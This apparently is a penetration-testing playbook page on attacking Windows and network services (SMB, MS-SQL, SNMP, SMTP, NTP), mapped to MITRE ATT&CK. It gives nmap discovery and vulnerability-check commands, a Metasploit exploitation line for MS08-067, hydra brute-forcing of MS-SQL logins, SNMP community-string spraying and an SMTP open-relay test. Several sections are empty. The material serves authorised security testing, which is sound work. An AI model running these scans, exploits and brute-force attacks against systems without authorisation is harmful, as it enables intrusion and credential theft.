
# Flawed Remote Services

## Overview

MITRE ATT&CK mapping: T1021 / T1210

## Procedures

### SMB service

Ports:

    TCP: 139,445
    UDP: 137

Specifications:

    https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cifs/
    https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb/

Discovery (directly from the wire):

```
nmap -sS -Pn -n -p445 -iL IP-ranges.txt -oG - --open | grep -E -v 'Nmap|Status' | cut -d' ' -f2 | tee smbServices.txt
```

Discovery (from previous scans):

```
python scripts/nparser.py -f vscanlatest -p445 -l | tee smbServices.txt
```

Additional enumeration:

```
nmap -n -sU -sS -Pn -pT:139,445,U:137 -sV --script=smb-os-discovery,smb-protocols,smb-security-mode,smb-system-info,smb2-capabilities,smb2-security-mode,smb2-time -iL smbServices.txt | tee vscans/smb-services-enumeration.out

Follow up:
https://nmap.org/nsedoc/scripts/smb-brute.html
https://nmap.org/nsedoc/scripts/smb-enum-domains.html
https://nmap.org/nsedoc/scripts/smb-enum-groups.html
https://nmap.org/nsedoc/scripts/smb-enum-processes.html
https://nmap.org/nsedoc/scripts/smb-enum-services.html
https://nmap.org/nsedoc/scripts/smb-enum-sessions.html
https://nmap.org/nsedoc/scripts/smb-enum-shares.html
https://nmap.org/nsedoc/scripts/smb-enum-users.html
```

Writable shares:

```
nmap -n --script=smb-enum-shares -p445 -iL smbServices.txt -oA vscans/smbEnumShares
```

Vulnerability: ms08-067

```
Reference: https://nmap.org/nsedoc/scripts/smb-vuln-ms08-067.html 
Affected: Windows Server 2000, Windows Server 2003, and Windows XP

Discovery:
nmap -sS -sU --script smb-vuln-ms08-067.nse -pT:445,139,U:137 -iL smb-services.txt --open -d | tee smb-vuln-ms08-067.out

Exploitation:
msf5 > use exploit/windows/smb/ms08_067_netapi
set RHOSTS <IP>
```

Vulnerability: ms10-054

```
Reference: https://nmap.org/nsedoc/scripts/smb-vuln-ms10-054.html
Notes: The script requires at least READ access right to a share on a remote machine.

Discovery:
nmap  -p 445 <target> --script=smb-vuln-ms10-054 --script-args unsafe -d
nmap -sS -sU --script smb-vuln-ms10-054.nse --script-args unsafe -pT:445,139,U:137 -iL smb-services.txt --open -d | tee smb-vuln-ms10-054.out
# grep for 'true' in smb-vuln-ms10-054.out
```

Vulnerability: ms10-06

```
Notes: 
Originally used by Stuxnet
In order for the check to work it needs access to at least one shared printer on the remote system
Reference: https://nmap.org/nsedoc/scripts/smb-vuln-ms10-061.html

Discovery:
nmap -sS -sU --script smb-vuln-ms10-061.nse -pT:445,139,U:137 -iL smb-services.txt --open -d | tee smb-vuln-ms10-061.out
```

Vulnerability: ms17-01

```
Notes:
EternalBlue (exploited by WannaCry)
Needs connection to IPC$ share
Tested on Windows XP, 2003, 7, 8, 8.1, 10, 2008, 2012 and 2016
Reference: https://nmap.org/nsedoc/scripts/smb-vuln-ms17-010.html

Discovery:
nmap -sS -sU --script smb-vuln-ms17-010 --max-hostgroup 3 -pT:445,139,U:137 -iL smb-services.txt --open -d | tee smb-vuln-ms17-010.out
```

### RDP service

```
TODO
```

### MS-SQL service

Ports:

    TCP: 1433
    UDP: 1434
    Other: https://docs.microsoft.com/en-us/sql/sql-server/install/configure-the-windows-firewall-to-allow-sql-server-access?view=sql-server-ver15

Reference:

```
https://nmap.org/nsedoc/lib/mssql.html
http://travisaltman.com/pen-test-and-hack-microsoft-sql-server-mssql/
```

Discovery:

```
# from the wire:
nmap -sS -Pn -n -p1433 -iL IP-ranges.txt -oG - --open | grep -E -v 'Nmap|Status' | cut -d' ' -f2 | tee mssqlServices.txt
udp-proto-scanner.pl --probe_name ms-sql <IPs>
nmap --script broadcast-ms-sql-discover

# from previous scans:
python nparser.py -f vscans/vscanlatest -p1433 -l | cut -d: -f1 |tee mssqlServices.txt
```

Enumeration:

    nmap -sS -Pn -n -p1433 -iL mssqlServices.txt --script ms-sql-info,ms-sql-ntlm-info

Check for empty passwords:

    nmap -p 1433 --script ms-sql-empty-password -iL mssqlServices.txt -v

Brute force attack:

    hydra -s 1433 -t 4 -T 8 -L ~/PAYLOADS/PASSWD/mssql-users.txt -P ~/PAYLOADS/PASSWD/mssql-passwds.txt -M mssqlServices.txt mssql

### WinRM service

### Other Windows services

Background:

    https://support.microsoft.com/en-us/help/832017/service-overview-and-network-port-requirements-for-windows

Discovery:

```
nmap -n -sU -sS -Pn -pT:135,139,445,5985,5986,47001,U:137 -T4 --open
```

### SNMP service

Ports:

    UDP: 161,162

Overview:

    https://en.wikipedia.org/wiki/Simple_Network_Management_Protocol

Discovery:

```
# from the wire:
udp-proto-scanner.pl --probe_name SNMPv3GetRequest --file IP-list.txt | tee snmpServices.out
cat snmpServices.out | extractIPs > snmpServices.txt
```

Enumeration (Nmap):

    # list Nmap's SNMP discovery scripts from https://github.com/leebaird/discover project:
    wget https://raw.githubusercontent.com/leebaird/discover/master/nse.sh
    grep 'nmap -iL $name/161.txt' nse.sh | grep -o -P -e '--script=.*?[[:space:]]'
    
    # run scan:
    nmap -n -T4 -sU -p161 --script <SCRIPTS> -iL snmpServices.txt

Enumeration (Metasploit):

```
wget https://raw.githubusercontent.com/leebaird/discover/master/resource/161-udp-snmp.rc
sed -i "s|setg RHOSTS.*|setg RHOSTS file:snmpServices.txt|g" 161-udp-snmp.rc
msfconsole -r 161-udp-snmp.rc
```

Brute forcing for weak community strings:

```
# Spray with most common community strings:
onesixtyone -d -c <(echo -n -e "public\nprivate\nmanager") -i snmpServices.txt

# Check with Nmap's builtin community strings:
nmap -n -T4 -sU --script snmp-brute -iL snmpServices.txt

# Other lists:
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/SNMP/common-snmp-community-strings.txt
# About ~3000 entries:
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/SNMP/snmp.txt
onesixtyone -d -c common-snmp-community-strings.txt -i snmpServices.txt
```

Extract SNMP related information:

    snmpwalk -c <COMMUNITY_STRING> -v1 <IP>

Known vulnerabilities:

    https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170629-snmp

### SMTP service

Ports:

    TCP: 25,587,465

Implementations:

    https://en.wikipedia.org/wiki/List_of_mail_server_software#SMTP

Discovery:

```
from the wire:
nmap -sS -Pn -n -p25,587,465 -iL IP-ranges.txt -oG - --open | grep -E -v 'Nmap|Status' | cut -d' ' -f2 | tee smtpServices.txt
```

Enumeration:

```
wget https://raw.githubusercontent.com/leebaird/discover/master/nse.sh
grep 'nmap -iL $name/smtp.txt' nse.sh | grep -o -P -e '--script=.*?[[:space:]]'
nmap -n -T4 -sS -p25,587,465 --script <SCRIPTS> -iL smtpServices.txt -oA vscans/smtp-enum

wget https://raw.githubusercontent.com/leebaird/discover/master/resource/25-smtp.rc
sed -i "s|setg RHOSTS.*|setg RHOSTS file:smtpServices.txt|g" 25-smtp.rc
msfconsole -r 25-smtp.rc | tee vscans/smtp-enum.out
```

Common misconfiguration: SMTP Open Relay

```
HELO ABC
MAIL FROM: foo@domain.com
RCPT TO: bar@domain.com
DATA
Testing for SMTP open relay issue.
.
QUIT
```

Noteworthy vulnerabilities:

```
```

### NTP service

Ports:

    UDP: 123

Discovery:

```
# from the wire:
udp-proto-scanner.pl --probe_name NTPRequest <IPs>
udp-proto-scanner.pl --probe_name ntp <IPs>
```

Enumeration:

```
nmap -n -T4 -sU -p123 --script=ntp-info,ntp-monlist -iL ntpServices.txt

wget https://raw.githubusercontent.com/leebaird/discover/master/resource/123-udp-ntp.rc
sed -i "s|setg RHOSTS.*|setg RHOSTS file:ntpServices.txt|g" 123-udp-ntp.rc
msfconsole -r 123-udp-ntp.rc
```

## OPSEC considerations

## Counter-countermeasures
